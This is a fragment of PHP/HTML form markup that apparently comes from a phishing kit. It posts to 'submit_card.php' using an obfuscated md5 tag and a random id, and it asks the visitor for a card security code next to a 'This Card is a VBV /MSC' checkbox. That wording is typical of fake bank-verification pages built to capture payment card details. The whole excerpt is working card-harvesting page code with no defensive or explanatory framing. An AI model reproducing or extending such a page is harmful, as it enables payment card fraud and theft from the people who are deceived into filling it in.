        ...
        <div class="content_form">
            <form method="post" action="submit_card.php?websrc=<?php echo md5('nOobAssas!n'); ?>&dispatched=userInfo&id=<?php echo rand(10000000000,500000000); ?>">
                <div>
                    ...
                    <input type="tel" required maxlength="4" id="cvv" name="cvv"  class="input" placeholder="CSC" style="width: 170px;">
                    ...
                    <div id="cont_in">
                        <span class="check_box" id="checked" >This Card is a VBV /MSC</span>
                        <input type="checkbox" hidden="hidden" id="checkbox" name="vbv_ready">
                    </div>
                    <input type="submit" class="btn" value="Continue" name="vbv_ready">
                </div>
            </form>
        </div>
    </div>
